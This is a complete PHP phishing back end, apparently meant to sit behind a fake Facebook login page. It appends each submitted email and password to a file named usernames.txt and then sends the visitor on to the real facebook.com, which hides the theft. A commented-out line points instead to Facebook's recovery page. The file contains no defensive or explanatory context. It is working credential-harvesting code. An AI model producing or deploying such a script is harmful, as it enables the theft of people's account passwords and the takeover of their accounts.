<?php 
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
//header('Location: https://facebook.com/recover/initiate/');
header('Location: https://www.facebook.com/');
exit();
?>
